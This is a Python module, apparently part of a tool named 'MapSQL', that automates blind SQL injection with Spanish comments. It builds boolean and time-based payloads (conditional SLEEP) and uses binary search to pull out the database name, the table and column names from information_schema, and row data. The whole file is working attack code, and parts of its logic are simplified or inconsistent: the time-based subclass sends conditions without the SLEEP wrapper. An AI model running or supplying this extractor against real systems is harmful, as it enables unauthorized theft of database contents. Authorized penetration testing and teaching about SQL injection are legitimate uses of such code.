"""
MapSQL - Blind SQLi Data Extraction
Extracción de datos usando inferencia booleana y time-based
"""

import time
import math
import threading
from typing import Dict, List, Tuple, Callable
import requests
from concurrent.futures import ThreadPoolExecutor

class BlindExtractor:
    """Extractor de datos para Blind SQL Injection"""
    
    def __init__(self, inject_func: Callable, method='boolean', max_threads=5):
        """
        Args:
            inject_func: Función que ejecuta una consulta SQL y retorna (response, time)
            method: 'boolean' o 'time'
            max_threads: Hilos para extracción paralela
        """
        self.inject = inject_func
        self.method = method
        self.max_threads = max_threads
        self.charset = self._generate_charset()
        self.results = {}
        
    def _generate_charset(self) -> str:
        """Genera conjunto de caracteres para extracción"""
        # Caracteres comunes en bases de datos
        return (
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "0123456789"
            "_@.-$#!?/\\ "
        )
    
    def boolean_query(self, condition: str, true_indicator: Callable = None) -> bool:
        """
        Ejecuta query booleana y determina si es verdadera
        
        Args:
            condition: Condición SQL (ej: "ascii(substr(database(),1,1)) > 100")
            true_indicator: Función que determina si respuesta indica True
        """
        query = f" AND ({condition})-- "
        response, elapsed = self.inject(query)
        
        if true_indicator:
            return true_indicator(response, elapsed)
        
        # Detección automática basada en cambios en respuesta
        if self.method == 'boolean':
            # Verificar cambios en contenido, longitud, etc.
            return len(response) > 0  # Simplificado
        else:
            # Time-based
            return elapsed > 5  # Si tardó más de 5 segundos
    
    def extract_bit_by_bit(self, query_template: str, max_length: int = 100) -> str:
        """
        Extracción usando búsqueda binaria (bit a bit)
        Más rápida que lineal
        
        Args:
            query_template: Template con {pos} y {char} (ej: "ascii(substr(({sql}),{pos},1)) > {char}")
            max_length: Longitud máxima a extraer
        """
        result = ""
        
        for pos in range(1, max_length + 1):
            # Búsqueda binaria del caracter
            low, high = 32, 126  # ASCII imprimible
            char_code = None
            
            while low <= high:
                mid = (low + high) // 2
                condition = query_template.format(pos=pos, char=mid)
                
                if self.boolean_query(condition):
                    low = mid + 1
                else:
                    char_code = mid
                    high = mid - 1
            
            if char_code is None or char_code < 32:
                break
                
            char = chr(char_code)
            result += char
            print(f"[*] Pos {pos}: {char} -> {result}")
            
            # Si encontramos caracter nulo o stop
            if char in ['\x00', '\x01']:
                break
        
        return result
    
    def extract_database_name(self) -> str:
        """Extrae nombre de la base de datos actual"""
        print("[Blind] Extrayendo nombre de la base de datos...")
        
        query_template = (
            "ascii(substr(database(),{pos},1)) > {char}"
        )
        
        return self.extract_bit_by_bit(query_template, max_length=30)
    
    def extract_table_names(self) -> List[str]:
        """Extrae nombres de tablas"""
        print("[Blind] Extrayendo nombres de tablas...")
        
        # Primero obtener número de tablas
        table_count_query = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()"
        
        # Extraer cada tabla
        tables = []
        for t in range(1, 11):  # Máximo 10 tablas
            table_name = self.extract_bit_by_bit(
                f"ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {t-1},1),{{pos}},1)) > {{char}}",
                max_length=50
            )
            
            if table_name:
                tables.append(table_name)
                print(f"[+] Tabla {t}: {table_name}")
            else:
                break
        
        return tables
    
    def extract_column_names(self, table_name: str) -> List[str]:
        """Extrae nombres de columnas de una tabla"""
        print(f"[Blind] Extrayendo columnas de {table_name}...")
        
        columns = []
        for c in range(1, 21):  # Máximo 20 columnas
            column_name = self.extract_bit_by_bit(
                f"ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {c-1},1),{{pos}},1)) > {{char}}",
                max_length=50
            )
            
            if column_name:
                columns.append(column_name)
                print(f"[+] Columna {c}: {column_name}")
            else:
                break
        
        return columns
    
    def extract_data(self, table_name: str, column_name: str, row_limit: int = 10) -> List[str]:
        """Extrae datos de una tabla/columna específica"""
        print(f"[Blind] Extrayendo datos de {table_name}.{column_name}...")
        
        data = []
        for row in range(1, row_limit + 1):
            value = self.extract_bit_by_bit(
                f"ascii(substr((SELECT {column_name} FROM {table_name} LIMIT {row-1},1),{{pos}},1)) > {{char}}",
                max_length=200
            )
            
            if value:
                data.append(value)
                print(f"[+] Row {row}: {value}")
            else:
                break
        
        return data
    
    def extract_with_concurrent(self, queries: List[Tuple[str, str]]) -> Dict:
        """
        Extracción concurrente de múltiples datos
        
        Args:
            queries: Lista de (nombre, query_template)
        """
        results = {}
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {}
            for name, query in queries:
                future = executor.submit(self.extract_bit_by_bit, query, 100)
                futures[future] = name
            
            for future in futures:
                name = futures[future]
                results[name] = future.result()
        
        return results


class TimeBasedBlindExtractor(BlindExtractor):
    """Versión especializada para Time-based Blind SQLi"""
    
    def __init__(self, inject_func: Callable, delay_seconds: float = 5.0):
        super().__init__(inject_func, method='time', max_threads=3)
        self.delay_seconds = delay_seconds
        self.time_threshold = delay_seconds * 0.8  # 80% del delay esperado
    
    def boolean_query(self, condition: str, true_indicator: Callable = None) -> bool:
        """Versión time-based: True = respuesta tardía"""
        # Construir query con SLEEP condicional
        query = f" AND IF({condition}, SLEEP({self.delay_seconds}), 0)-- "
        
        _, elapsed = self.inject(query)
        
        # Si tardó cerca del delay, condición es verdadera
        return elapsed >= self.time_threshold
    
    def extract_bit_by_bit(self, query_template: str, max_length: int = 100) -> str:
        """Versión optimizada para time-based (más lenta)"""
        result = ""
        
        print("[!] Time-based extraction es LENTO - paciencia...")
        
        for pos in range(1, max_length + 1):
            # Búsqueda binaria pero con timeouts
            low, high = 32, 126
            char_code = None
            
            for attempt in range(10):  # Intentos con reintentos
                if low > high:
                    break
                    
                mid = (low + high) // 2
                condition = query_template.format(pos=pos, char=mid)
                
                # Múltiples mediciones para precisión
                times = []
                for _ in range(2):  # 2 mediciones por punto
                    _, elapsed = self.inject(condition)
                    times.append(elapsed)
                
                avg_time = sum(times) / len(times)
                
                if avg_time >= self.time_threshold:
                    low = mid + 1
                else:
                    char_code = mid
                    high = mid - 1
            
            if char_code is None or char_code < 32:
                break
                
            char = chr(char_code)
            result += char
            print(f"[Time] Pos {pos}: {char} -> {result}")
            
            # Mostrar progreso
            print(f"[Progress] {len(result)}/{max_length} chars")
        
        return result
